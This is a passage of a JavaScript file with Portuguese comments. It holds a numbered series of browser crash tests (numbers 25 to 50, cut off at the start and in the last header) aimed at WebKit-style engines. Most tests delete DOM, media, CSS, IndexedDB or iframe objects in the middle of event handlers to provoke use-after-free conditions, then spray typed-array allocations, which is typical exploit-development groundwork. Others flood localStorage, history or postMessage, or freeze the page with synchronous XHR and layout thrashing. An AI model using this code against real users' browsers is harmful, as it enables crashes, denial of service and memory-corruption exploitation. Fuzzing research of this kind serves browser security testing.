    // Vulnerabilidade: O navegador cria uma "imagem fantasma" para o arrasto.
    // Nós removemos o elemento fonte. O navegador tenta arrastar o "nada".
    // =================================================================
    function e25(stage) {
        const d = document.createElement('div');
        d.draggable = true;
        d.innerText = "DRAG SOURCE";
        d.style.background = "orange";
        d.style.padding = "20px";
        stage.appendChild(d);

        d.ondragstart = (e) => {
            // Define dados para validar o drag
            e.dataTransfer.setData("text", "crash");
            
            window.alert("⚠️ DRAG GHOST ⚠️\nOk = Remover Fonte.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Remove o elemento que está sendo arrastado
            stage.removeChild(d);
            
            // Spray
            spray.push(new Uint32Array(pattern));
        };

        // Simula inicio do drag
        setTimeout(() => {
            d.dispatchEvent(new Event("dragstart"));
        }, 500);
    }
// =================================================================
    // 26. onUpgradeNeeded -> deleteDatabase
    // Evento: onupgradeneeded (IndexedDB criando/alterando schema)
    // API: deleteDatabase (Apaga o arquivo do disco)
    // Vulnerabilidade: O navegador está abrindo o arquivo do banco de dados e
    // criando estruturas. Nós mandamos deletar o arquivo no meio do processo.
    // =================================================================
    function e26(stage) {
        const d = document.createElement('div');
        d.innerText = "DB RACE";
        stage.appendChild(d);

        // Inicia abertura do banco
        const request = indexedDB.open("CrashDB", Math.random()); // Versão aleatória força upgrade

        request.onupgradeneeded = () => {
            window.alert("⚠️ DB WRITE LOCK ⚠️\nOk = Deletar Banco de Dados.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Tenta fechar e deletar enquanto o evento de upgrade ainda está rodando
            try {
                request.transaction.abort();
                indexedDB.deleteDatabase("CrashDB");
            } catch(e) {}
            
            // Spray para preencher buffer de I/O
            spray.push(new ArrayBuffer(1024*1024));
        };
        
        // Gatilho automático ao abrir
    }

    // =================================================================
    // 27. onPointerDown -> deleteCell
    // Evento: onpointerdown (Clique/Toque preciso)
    // API: deleteCell (Modificação estrutural de tabela)
    // Vulnerabilidade: O sistema de Hit Testing calcula qual célula foi clicada.
    // Nós removemos a célula da memória durante o clique.
    // =================================================================
    function e27(stage) {
        const table = document.createElement('table');
        table.border = "1";
        const row = table.insertRow();
        const cell = row.insertCell();
        cell.innerText = "CLIQUE AQUI (POINTER)";
        cell.style.padding = "40px";
        cell.style.background = "red";
        stage.appendChild(table);

        cell.onpointerdown = () => {
            window.alert("⚠️ TABLE LAYOUT ⚠️\nOk = Deletar Célula.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Remove a célula (índice 0) da linha
            row.deleteCell(0);
            
            // Tenta acessar propriedades da célula morta (UAF)
            const w = cell.offsetWidth;
            
            spray.push(new Uint32Array(pattern));
        };

        // Simula clique
        setTimeout(() => {
            const ev = new PointerEvent("pointerdown");
            cell.dispatchEvent(ev);
        }, 500);
    }

    // =================================================================
    // 28. MatchMedia -> removeChild (Style)
    // Evento: matchMedia listener (Mudança de CSS Media Query)
    // API: removeChild (Remove a tag <style>)
    // Vulnerabilidade: O CSSOM detecta que o tamanho da tela mudou (pelo Fullscreen).
    // O listener dispara. Nós removemos a folha de estilo que contém as regras.
    // =================================================================
    function e28(stage) {
        const style = document.createElement('style');
        style.innerText = "@media (min-width: 100px) { body { background: red; } }";
        document.head.appendChild(style);

        const d = document.createElement('div');
        d.innerText = "MEDIA QUERY TRAP";
        stage.appendChild(d);

        // Cria listener para mudança de largura (vai acontecer no fullscreen)
        const mql = window.matchMedia("(min-width: 100px)");
        
        mql.addListener(() => {
            window.alert("⚠️ CSSOM UPDATE ⚠️\nOk = Remover Folha de Estilo.");
            
            // AÇÃO DESTRUTIVA
            // Remove a tag style inteira. O motor CSS perde as referências.
            document.head.removeChild(style);
            
            spray.push(new Float64Array(1000));
        });

        // Gatilho: Entrar em fullscreen muda a largura da viewport
        d.onclick = () => {
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 29. onPageHide -> window.close() (Iframe Context)
    // Evento: onpagehide (Navegação saindo da página)
    // API: close() (Fecha a janela/contexto)
    // Vulnerabilidade: O navegador está tentando salvar o estado da página (BFCache).
    // Nós forçamos o fechamento do contexto no meio do processo.
    // =================================================================
    function e29(stage) {
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        ifr.onload = () => {
            const win = ifr.contentWindow;
            
            win.onpagehide = () => {
                window.alert("⚠️ CONTEXT CLOSE ⚠️\nOk = Fechar Janela.");
                
                if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

                // AÇÃO DESTRUTIVA
                // Fecha o contexto de navegação do iframe
                win.close();
                ifr.remove();
                
                spray.push(new ArrayBuffer(1024*1024));
            };

            // Força navegação para disparar pagehide
            setTimeout(() => {
                win.location.href = "about:blank";
            }, 200);
        };
    }

    // =================================================================
    // 30. onLoad -> revokeObjectURL (Image UAF)
    // Evento: onload (Imagem carregada e decodificada)
    // API: URL.revokeObjectURL (Libera a memória do Blob)
    // Vulnerabilidade: A imagem acabou de carregar e está sendo pintada na tela.
    // Nós invalidamos o ponteiro de memória do Blob imediatamente.
    // =================================================================
    function e30(stage) {
        // Cria imagem via Blob
        const blob = new Blob(["<svg xmlns='http://www.w3.org/2000/svg'><rect width='100' height='100' fill='red'/></svg>"], {type: 'image/svg+xml'});
        const url = URL.createObjectURL(blob);
        
        const img = new Image();
        img.style.width = "100%";
        stage.appendChild(img);

        img.onload = () => {
            window.alert("⚠️ BLOB MEMORY ⚠️\nOk = Revogar URL (Free).");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Diz ao navegador: "Essa memória está livre agora".
            // Mas a imagem 'img' ainda está no DOM tentando ser desenhada.
            URL.revokeObjectURL(url);
            
            // Força recálculo
            img.src = ""; 
            img.src = url; // Reatribui URL morta
            
            spray.push(new Uint32Array(pattern));
        };

        // Inicia carregamento
        setTimeout(() => { img.src = url; }, 500);
    }
// =================================================================
    // 31. onUnload -> Storage Flood
    // Evento: onunload (Dispara quando a página está fechando)
    // API: localStorage (IO de disco Síncrono)
    // Vulnerabilidade: Tenta gravar megabytes no disco RÍGIDO enquanto
    // o navegador tenta matar o processo da página. Concorrência de I/O.
    // =================================================================
    function s31(stage) {
        const d = document.createElement('div');
        d.innerText = "EXIT TRAP (CLIQUE AQUI)";
        d.style.border = "1px solid red";
        d.style.padding = "20px";
        stage.appendChild(d);

        // Prepara o payload
        const junk = "CRASH".repeat(1024 * 100); // 500KB string

        // O GATILHO: Acontece quando você tenta sair ou recarregar
        window.onunload = () => {
            // Loop de bloqueio na saída
            for(let i=0; i<100; i++) {
                try {
                    localStorage.setItem("bomb"+i, junk);
                } catch(e) {
                    // Se der erro (disco cheio), limpa e continua
                    localStorage.clear();
                }
            }
        };

        d.onclick = () => {
            // Força o reload para disparar o evento
            d.innerText = "FORÇANDO RELOAD...";
            setTimeout(() => window.location.reload(), 500);
        };
    }

    // =================================================================
    // 32. onBeforePrint -> document.write
    // Evento: onbeforeprint (Ou matchMedia print)
    // API: document.write (Nuke)
    // Vulnerabilidade: O navegador tenta gerar uma pré-visualização de impressão (PDF/Imagem).
    // Nós destruímos o documento durante a geração dessa imagem.
    // =================================================================
    function s32(stage) {
        const d = document.createElement('div');
        d.innerText = "PRINT NUKE";
        stage.appendChild(d);

        // Listener para mudança de mídia (Impressão)
        const mediaQueryList = window.matchMedia('print');
        
        const nuke = () => {
            // O navegador está tentando "ler" a página para imprimir
            // Nós apagamos a página agora.
            document.open();
            document.write("<h1>PAPER JAM</h1>");
            document.close();
            
            // Aloca memória gráfica
            spray.push(new ArrayBuffer(1024*1024*10));
        };

        mediaQueryList.addListener(nuke);
        window.onbeforeprint = nuke;

        d.onclick = () => {
            // Tenta abrir o diálogo de impressão
            try {
                window.print();
            } catch(e) {
                d.innerText = "Print não suportado? Tentando simular media type.";
                // Fallback: tentar forçar estilo de impressão via CSS
                const style = document.createElement('style');
                style.media = "screen";
                style.innerText = "@media screen { body { width: 10000px; } }";
                document.head.appendChild(style);
            }
        };
    }

    // =================================================================
    // 33. Sync XHR (Freeze) -> removeChild
    // Evento: Clique (Mouse/Touch)
    // API: XMLHttpRequest (Modo Síncrono = false) + removeChild
    // Vulnerabilidade: XHR Síncrono congela a UI completamente.
    // Se removermos o elemento e chamarmos o XHR, o navegador trava num estado inválido.
    // =================================================================
    function s33(stage) {
        const d = document.createElement('div');
        d.innerText = "SYNC FREEZE";
        d.style.background = "blue";
        stage.appendChild(d);

        d.onclick = () => {
            d.innerText = "FREEZING...";
            
            // 1. Remove o elemento do DOM
            setTimeout(() => {
                d.remove();
            }, 0);

            // 2. Trava a Thread Principal imediatamente
            // O navegador agenda a remoção visual, mas a thread JS trava aqui
            const xhr = new XMLHttpRequest();
            // URL que demora ou não existe, mas o parâmetro FALSE trava tudo
            try {
                xhr.open("GET", "http://127.0.0.1:9999/block", false); 
                xhr.send(null);
            } catch(e) {
                // O erro ocorre depois do timeout da rede
            }
            
            // 3. Ao destravarem (se destravarem), o estado está corrompido
            spray.push(new Uint32Array(10000).fill(0xDEAD));
        };
    }

    // =================================================================
    // 34. getComputedStyle Thrashing (Layout Bomb)
    // Evento: Loop Síncrono
    // API: getComputedStyle (Força recálculo de layout)
    // Vulnerabilidade: "Layout Thrashing". Força a CPU/GPU a recalcular a geometria
    // milhares de vezes, causando aquecimento e race conditions no renderizador.
    // =================================================================
    function s34(stage) {
        const d = document.createElement('div');
        d.innerText = "LAYOUT THRASHING";
        d.style.width = "10px";
        d.style.background = "green";
        d.style.transition = "width 0.1s";
        stage.appendChild(d);

        d.onclick = () => {
            const start = Date.now();
            
            // Loop da morte
            function loop() {
                // Lê (Força Recalc)
                const w = window.getComputedStyle(d).width;
                
                // Escreve (Invalida Layout)
                d.style.width = (Math.random() * 1000) + "px";
                
                // Lê de novo (Força Recalc Imediato)
                const h = d.offsetWidth;
                
                // Escreve de novo
                d.innerHTML = Math.random();

                // Cria nós e remove (Pressão no DOM)
                const s = document.createElement('span');
                d.appendChild(s);
                d.removeChild(s);

                // Continua o loop agressivamente
                if (Date.now() - start < 5000) { 
                    // Sem requestAnimationFrame, loop síncrono ou microtask
                    Promise.resolve().then(loop);
                }
            }
            loop();
        };
    }

    // =================================================================
    // 35. onMessage -> history.pushState Flood
    // Evento: onmessage (PostMessage entre janelas/iframes)
    // API: history.pushState (Enche a memória de sessão)
    // Vulnerabilidade: Stack Overflow assíncrono. Dois iframes mandam mensagens
    // um para o outro infinitamente, criando estados de histórico até o crash.
    // =================================================================
    function s35(stage) {
        const d = document.createElement('div');
        d.innerText = "PING PONG CRASH";
        stage.appendChild(d);

        // Iframe 1
        const ifr1 = document.createElement('iframe');
        // Iframe 2
        const ifr2 = document.createElement('iframe');
        
        stage.appendChild(ifr1);
        stage.appendChild(ifr2);

        // Código do Iframe (Blob)
        const code = `
            window.onmessage = function(e) {
                // Cria pressão na memória de histórico
                try {
                    history.pushState({junk: "A".repeat(1024)}, "", "#"+Math.random());
                } catch(e) {}
                
                // Responde imediatamente
                e.source.postMessage("PING", "*");
            };
        `;
        
        // Injeta código nos iframes
        // Nota: Em same-origin é mais fácil acessar contentWindow diretamente
        
        d.onclick = () => {
            const win1 = ifr1.contentWindow;
            const win2 = ifr2.contentWindow;
            
            // Configura listeners
            win1.eval(code);
            win2.eval(code);
            
            // Inicia o jogo
            win1.postMessage("START", "*");
            // Conecta os dois (win1 manda msg, win1 responde pra top, top manda pra win2...)
            // Simplificação: Vamos fazer o Top mandar para os dois freneticamente
            
            setInterval(() => {
                win1.postMessage("FLOOD", "*");
                win2.postMessage("FLOOD", "*");
            }, 1);
            
            d.innerText = "FLOODING HISTORY...";
        };
    }
// =================================================================
    // 36. onInvalid -> innerHTML (Validation Bubble Race)
    // Evento: oninvalid (Dispara quando um form tenta submit inválido)
    // API: innerHTML (Destruição)
    // Vulnerabilidade: O navegador tenta desenhar o balãozinho "Preencha este campo"
    // apontando para um input que nós deletamos no exato momento do erro.
    // =================================================================
    function e36(stage) {
        const form = document.createElement('form');
        // Input obrigatório (required) gera o evento oninvalid se vazio
        form.innerHTML = `<input type="text" required id="v_target" style="width:200px">`;
        stage.appendChild(form);

        const input = document.getElementById('v_target');

        input.oninvalid = () => {
            window.alert("⚠️ VALIDATION UI ⚠️\nOk = Destruir Input.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // O balão de UI do sistema está tentando ancorar neste elemento
            stage.innerHTML = "<h1>GONE</h1>";
            
            // Spray
            spray.push(new Uint32Array(pattern));
        };

        // Simula o submit que vai falhar
        setTimeout(() => {
            // CheckValidity dispara o evento se falhar
            if(!form.checkValidity()) {
                // Força o navegador a mostrar a UI (Submit real)
                const submitBtn = document.createElement('button');
                form.appendChild(submitBtn);
                submitBtn.click();
            }
        }, 500);
    }

    // =================================================================
    // 37. InsertRule -> Sheet.disabled (CSSOM Race)
    // Evento: Loop de Inserção
    // API: stylesheet.disabled = true (Desativação em massa)
    // Vulnerabilidade: Inserimos milhares de regras CSS forçando o motor a trabalhar.
    // No meio do cálculo, desativamos a folha inteira. Rollback violento.
    // =================================================================
    function e37(stage) {
        const style = document.createElement('style');
        document.head.appendChild(style);
        const sheet = style.sheet;

        const d = document.createElement('div');
        d.id = "css_target";
        d.innerText = "CSS STRESS";
        stage.appendChild(d);

        d.onclick = () => {
            window.alert("⚠️ CSSOM FLOOD ⚠️\nOk = Desativar Folha.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // 1. Injeta 5000 regras rapidamente
            // Isso estressa a memória de estilo
            try {
                for(let i=0; i<5000; i++) {
                    sheet.insertRule(`#css_target { border: ${i}px solid red; }`, 0);
                }
            } catch(e) {}

            // 2. AÇÃO DESTRUTIVA
            // Desativa a folha enquanto o renderizador tenta aplicar as 5000 regras
            style.disabled = true;
            
            // Remove do DOM também
            document.head.removeChild(style);
            
            spray.push(new ArrayBuffer(1024*1024));
        };
        
        // Gatilho automático
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 38. ContextLost -> Canvas Resize (GPU Detach)
    // Evento: webglcontextlost (Simulado via extensão ou stress)
    // API: canvas.width = 0 (Resize/Clear)
    // Vulnerabilidade: O contexto WebGL perde a conexão com a GPU.
    // O handler tenta restaurar, mas nós redimensionamos o canvas para zero.
    // =================================================================
    function e38(stage) {
        const canvas = document.createElement('canvas');
        canvas.width = 500; canvas.height = 500;
        stage.appendChild(canvas);
        
        // Tenta pegar WebGL (ou experimental)
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if(!gl) {
            stage.innerText = "WebGL não suportado, tentando Canvas 2D Crash...";
            // Fallback para 2D context loss simulado
        }

        // Tenta acessar extensão de debug para simular perda de contexto
        const ext = gl ? gl.getExtension('WEBGL_lose_context') : null;

        canvas.addEventListener('webglcontextlost', (e) => {
            e.preventDefault(); // Impede restauração automática
            window.alert("⚠️ GPU CONTEXT LOST ⚠️\nOk = Redimensionar para 0.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // O buffer gráfico está instável. Zerar o tamanho força realocação.
            canvas.width = 0;
            canvas.height = 0;
            canvas.remove();
            
            spray.push(new Float64Array(5000));
        }, false);

        // Gatilho
        setTimeout(() => {
            if(ext) {
                ext.loseContext(); // Simulação perfeita
            } else {
                // Simulação "bruta" via sobrecarga
                // Tenta criar texturas até falhar
                try {
                    for(let i=0; i<1000; i++) gl.createTexture();
                    // Dispara evento manual se não crashar natural
                    canvas.dispatchEvent(new Event('webglcontextlost'));
                } catch(e){}
            }
        }, 500);
    }

    // =================================================================
    // 39. SVG Path Mutation -> forceRedraw
    // Evento: Manipulação de DOM
    // API: forceRedraw (SVG) + d attribute change
    // Vulnerabilidade: Alterar a geometria complexa de um vetor (Path)
    // e forçar um redesenho síncrono imediatamente.
    // =================================================================
    function e39(stage) {
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        svg.setAttribute("width", "100%"); svg.setAttribute("height", "100%");
        
        const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
        path.setAttribute("d", "M10 10 H 90 V 90 H 10 L 10 10"); // Quadrado simples
        path.setAttribute("fill", "green");
        
        svg.appendChild(path);
        stage.appendChild(svg);

        // Gatilho no clique
        svg.onclick = () => {
            window.alert("⚠️ SVG GEOMETRY ⚠️\nOk = Mutar Path e Forçar Redraw.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // 1. Define um path inválido ou extremamente complexo
            path.setAttribute("d", "M 0 0 " + "L 100 100 ".repeat(1000));
            
            // 2. Remove o elemento path do DOM
            path.remove();
            
            // 3. Tenta forçar o SVG pai a redesenhar (acessando filho morto?)
            try { svg.forceRedraw(); } catch(e){}
            
            // 4. Pausa de suspensão
            try { svg.suspendRedraw(100); } catch(e){}
            
            spray.push(new Uint32Array(pattern));
        };
        
        setTimeout(() => svg.click(), 500);
    }

    // =================================================================
    // 40. Recursive adoptNode (Memory Stress)
    // Evento: Loop Recursivo
    // API: adoptNode (Troca de documento)
    // Vulnerabilidade: "Ping-Pong". Passamos um nó entre o documento principal
    // e um iframe repetidamente até a memória corromper.
    // =================================================================
    function e40(stage) {
        const d = document.createElement('div');
        d.innerText = "PING PONG NODE";
        stage.appendChild(d);

        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        d.onclick = () => {
            window.alert("⚠️ NODE ADOPTION ⚠️\nOk = Ping Pong Infinito.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            const docMain = document;
            const docFrame = ifr.contentDocument;
            const target = d;

            // AÇÃO DESTRUTIVA (Loop Infinito Síncrono)
            try {
                for(let i=0; i<5000; i++) {
                    // Adota para o iframe
                    docFrame.adoptNode(target);
                    docFrame.body.appendChild(target);
                    
                    // Adota de volta para o main
                    docMain.adoptNode(target);
                    stage.appendChild(target);
                    
                    // A cada 100 ciclos, muda uma propriedade para forçar render
                    if(i % 100 === 0) target.style.color = (i%2)?"red":"blue";
                }
            } catch(e) {
                // Se falhar, tentamos destruir tudo
                stage.innerHTML = "CRASHED?";
            }
            
            spray.push(new Float64Array(2000));
        };
        
        setTimeout(() => d.click(), 500);
    }
// =================================================================
    // 41. onMessage -> Iframe.remove() (Cross-Context UAF)
    // Evento: onmessage (Comunicação entre janelas)
    // API: remove() (Destruição de contexto)
    // Vulnerabilidade: O iframe envia uma mensagem. O pai recebe.
    // O pai destrói o iframe imediatamente. Se o loop de mensagens tentar
    // enviar uma resposta (ACK) para o iframe morto... Crash.
    // =================================================================
    function e41(stage) {
        const d = document.createElement('div');
        d.innerText = "MESSAGE BOMB";
        stage.appendChild(d);

        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        // Código do iframe: Envia mensagens sem parar
        const code = `
            setInterval(() => { window.parent.postMessage("FLOOD", "*"); }, 10);
        `;
        ifr.contentWindow.eval(code);

        // Handler no pai
        window.onmessage = (e) => {
            // Garante que é do nosso iframe
            if(e.source !== ifr.contentWindow) return;
            
            // Pausa no primeiro pacote
            window.onmessage = null; // Para de ouvir para não travar o alerta
            
            window.alert("⚠️ IPC KILL ⚠️\nOk = Matar Iframe Comunicante.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Remove o iframe que está no meio de um loop de postMessage
            ifr.remove();
            
            // Spray
            spray.push(new ArrayBuffer(1024*1024));
        };
    }

    // =================================================================
    // 42. onWaiting -> src=null (Buffer Underrun)
    // Evento: onwaiting (O vídeo parou para carregar/bufferizar)
    // API: src = null + load() (Limpeza de pipeline)
    // Vulnerabilidade: O decoder de vídeo está "faminto" (waiting), pedindo dados.
    // Nós cortamos a fonte de dados e resetamos o player.
    // =================================================================
    function e42(stage) {
        const video = document.createElement('video');
        // Arquivo grande para forçar buffering ou URL lenta
        video.src = "http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4"; 
        video.controls = true;
        video.preload = "auto";
        stage.appendChild(video);

        video.onwaiting = () => {
            window.alert("⚠️ BUFFER HUNGER ⚠️\nOk = Cortar Fonte de Dados.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            video.pause();
            video.src = ""; // Nulifica a fonte
            video.load();   // Força reset do driver
            video.remove();
            
            // Spray pesado
            spray.push(new Float64Array(10000));
        };
        
        // Inicia reprodução para causar o 'waiting'
        setTimeout(() => video.play(), 500);
    }

    // =================================================================
    // 43. onDragStart -> Selection.deleteFromDocument()
    // Evento: ondragstart (Usuário arrasta texto selecionado)
    // API: deleteFromDocument (Apaga a seleção)
    // Vulnerabilidade: O sistema tenta criar uma imagem "fantasma" do texto arrastado.
    // Nós apagamos o texto do documento enquanto o sistema lê os pixels.
    // =================================================================
    function e43(stage) {
        const d = document.createElement('div');
        d.innerText = "SELECIONE E ARRASTE ESTE TEXTO AGORA";
        d.style.fontSize = "24px";
        d.style.background = "yellow";
        d.style.color = "black";
        stage.appendChild(d);

        d.ondragstart = () => {
            window.alert("⚠️ DRAG GHOST ⚠️\nOk = Deletar Texto Selecionado.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            const sel = window.getSelection();
            // Apaga o que está sendo arrastado
            sel.deleteFromDocument(); 
            
            // Spray
            spray.push(new Uint32Array(pattern));
        };

        // Seleciona o texto automaticamente
        const range = document.createRange();
        range.selectNodeContents(d);
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(range);
    }

    // =================================================================
    // 44. onResize -> deleteTFoot() (Table Layout)
    // Evento: onresize (Fullscreen aciona isso)
    // API: deleteTFoot (Remove rodapé da tabela)
    // Vulnerabilidade: Tabelas calculam layout em passos: Header -> Body -> Footer.
    // O resize força recálculo. Se removermos o Footer no meio, o iterador de layout falha.
    // =================================================================
    function e44(stage) {
        const table = document.createElement('table');
        table.style.width = "100%";
        table.border = "1";
        
        // Header e Body
        table.createTHead().insertRow().insertCell().innerText = "HEADER";
        const tbody = table.createTBody();
        for(let i=0; i<10; i++) tbody.insertRow().insertCell().innerText = "DATA";
        
        // O Alvo: TFOOT
        const tfoot = table.createTFoot();
        tfoot.insertRow().insertCell().innerText = "FOOTER (ALVO)";
        
        stage.appendChild(table);

        // Ocorre quando a tela muda de tamanho (Fullscreen)
        window.onresize = () => {
            // Filtra resize pequeno
            if(window.innerWidth < 100) return;
            
            // Pausa no primeiro evento
            window.onresize = null;
            
            // AÇÃO DESTRUTIVA (Sem alerta para ser rápido no meio do layout)
            // Se quiser testar com alerta, descomente a linha abaixo
            // window.alert("⚠️ TABLE RESIZE ⚠️\nOk = Deletar Footer.");
            
            // Remove o rodapé enquanto o navegador ajusta a largura das colunas
            table.deleteTFoot();
            
            // Tenta acessar geometria
            const h = table.offsetHeight;
            
            spray.push(new Float64Array(1000));
        };

        // Gatilho Manual
        setTimeout(() => {
             if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();
        }, 500);
    }

    // =================================================================
    // 45. TreeWalker -> removeChild() (Iterator Invalidation)
    // Evento: Loop de navegação
    // API: TreeWalker (Navegação avançada de DOM)
    // Vulnerabilidade: Criamos um iterador que anda pelo DOM.
    // Enquanto ele anda, removemos o nó que está "embaixo" dele.
    // =================================================================
    function e45(stage) {
        const root = document.createElement('div');
        // Cria árvore profunda
        let curr = root;
        for(let i=0; i<50; i++) {
            const el = document.createElement('div');
            el.id = "node_" + i;
            curr.appendChild(el);
            curr = el;
        }
        stage.appendChild(root);

        const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, null, false);

        root.onclick = () => {
            window.alert("⚠️ TREE WALKER ⚠️\nOk = Destruir Nó Atual.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Avança alguns passos
            walker.nextNode(); 
            walker.nextNode();
            const currentNode = walker.currentNode; // Estamos no nó ~2
            
            // AÇÃO DESTRUTIVA
            // Remove o nó onde o walker está "pisando"
            if(currentNode.parentNode) currentNode.parentNode.removeChild(currentNode);
            
            // Tenta avançar com o walker a partir de um nó morto
            try {
                walker.nextNode(); // Aqui deve ocorrer o UAF ou Crash
                document.title = walker.currentNode.id;
            } catch(e) {}
            
            spray.push(new Uint32Array(pattern));
        };
        
        setTimeout(() => root.click(), 500);
    }
// =================================================================
    // 46. DOMNodeInserted -> deleteRule() (Style Recalc Race)
    // Evento: DOMNodeInserted (Dispara quando um elemento entra no DOM)
    // API: deleteRule (CSSOM)
    // Vulnerabilidade: Ao inserir um nó, o navegador dispara o recálculo de estilo.
    // Nós interceptamos esse evento e deletamos a regra CSS que se aplicaria ao nó.
    // =================================================================
    function e46(stage) {
        // Prepara CSS dinâmico
        const style = document.createElement('style');
        style.textContent = ".victim { width: 100px; height: 100px; background: red; }";
        document.head.appendChild(style);
        const sheet = style.sheet;

        const d = document.createElement('div');
        d.innerText = "DOM MUTATION TRAP";
        stage.appendChild(d);

        // Listener de Mutação (Evento síncrono em WebKit antigo)
        stage.addEventListener("DOMNodeInserted", function(e) {
            // Filtra para não loopar no próprio spray
            if(e.target.className !== "victim") return;

            window.alert("⚠️ STYLE RECALC ⚠️\nOk = Deletar Regra CSS.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // O elemento acabou de ser inserido e está buscando seu estilo.
            // Nós deletamos a regra da memória.
            try {
                sheet.deleteRule(0);
            } catch(err) {}
            
            // Spray
            spray.push(new Float64Array(1000));
        }, false);

        // GATILHO: Inserir o elemento
        d.onclick = () => {
            const victim = document.createElement('div');
            victim.className = "victim";
            stage.appendChild(victim);
        };
        
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 47. onToggle -> innerHTML (Details/Summary Layout)
    // Evento: ontoggle (Abrir/Fechar elemento <details>)
    // API: innerHTML (Destruição de filhos)
    // Vulnerabilidade: O elemento <details> é complexo, tem animação nativa de abrir.
    // Destruir seu conteúdo ("summary") durante a abertura corrompe o layout engine.
    // =================================================================
    function e47(stage) {
        const details = document.createElement('details');
        const summary = document.createElement('summary');
        summary.innerText = "CLIQUE PARA ABRIR";
        details.appendChild(summary);
        
        const content = document.createElement('p');
        content.innerText = "CONTEÚDO SECRETO ".repeat(50);
        details.appendChild(content);
        
        stage.appendChild(details);

        details.ontoggle = () => {
            // Só dispara na abertura
            if(!details.open) return;

            window.alert("⚠️ DETAILS LAYOUT ⚠️\nOk = Nuke Conteúdo.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // O navegador está calculando a altura do conteúdo para animar a abertura.
            // Nós removemos o conteúdo.
            details.innerHTML = ""; 
            
            // Spray
            spray.push(new Uint32Array(pattern));
        };
        
        // Tenta abrir via JS
        setTimeout(() => {
            details.open = true; // Dispara toggle
        }, 500);
    }

    // =================================================================
    // 48. SelectionChange -> TextNode.data (Rendering UAF)
    // Evento: selectionchange (Mudança de cursor/seleção)
    // API: TextNode.data / appendData (Manipulação de string crua)
    // Vulnerabilidade: O renderizador de texto mantém ponteiros para a string selecionada.
    // Alterar os dados brutos do nó de texto invalida esses ponteiros.
    // =================================================================
    function e48(stage) {
        const d = document.createElement('div');
        d.innerText = "TEXTO PARA SELEÇÃO AUTOMÁTICA";
        stage.appendChild(d);
        
        // Pega o nó de texto cru
        const textNode = d.firstChild;

        document.onselectionchange = () => {
            // Evita loop infinito
            document.onselectionchange = null;

            window.alert("⚠️ TEXT RENDERER ⚠️\nOk = Corromper Dados do Nó.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Substitui o texto subjacente enquanto ele está destacado/selecionado
            textNode.data = "GONE"; 
            
            // Spray
            spray.push(new ArrayBuffer(1024*1024));
        };

        // Trigger: Selecionar texto via Range
        setTimeout(() => {
            const range = document.createRange();
            range.setStart(textNode, 0);
            range.setEnd(textNode, 10);
            const sel = window.getSelection();
            sel.removeAllRanges();
            sel.addRange(range);
        }, 500);
    }

    // =================================================================
    // 49. Filter Effect -> removeAttribute (Compositor Crash)
    // Evento: SVG Filter rendering
    // API: removeAttribute (Remove ID do filtro)
    // Vulnerabilidade: Filtros SVG usam muita GPU. Aplicamos um filtro num DIV via CSS.
    // Entramos em Fullscreen. Removemos a definição do filtro do DOM.
    // =================================================================
    function e49(stage) {
        // Define Filtro SVG
        stage.innerHTML = `
            <svg height="0" width="0">
                <defs>
                    <filter id="crashBlur">
                        <feGaussianBlur in="SourceGraphic" stdDeviation="10" />
                    </filter>
                </defs>
            </svg>
            <div id="filtered" style="width:100%; height:100%; background:green; filter: url(#crashBlur);">
                GPU FILTER TARGET
            </div>
        `;

        const target = document.getElementById('filtered');
        const filterDef = stage.querySelector('filter');

        target.onclick = () => {
            window.alert("⚠️ SVG FILTER ⚠️\nOk = Remover Definição do Filtro.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // O elemento 'target' está tentando usar o filtro '#crashBlur'.
            // Nós removemos o ID do filtro, tornando a referência inválida durante o render.
            filterDef.removeAttribute("id");
            filterDef.remove();
            
            // Força repaint
            target.style.display = "none";
            target.offsetHeight;
            target.style.display = "block";

            spray.push(new Uint32Array(pattern));
        };
        
        setTimeout(() => target.click(), 500);
    }

    // =================================================================
    // 50. Textarea Scroll -> value reset (Shadow DOM)
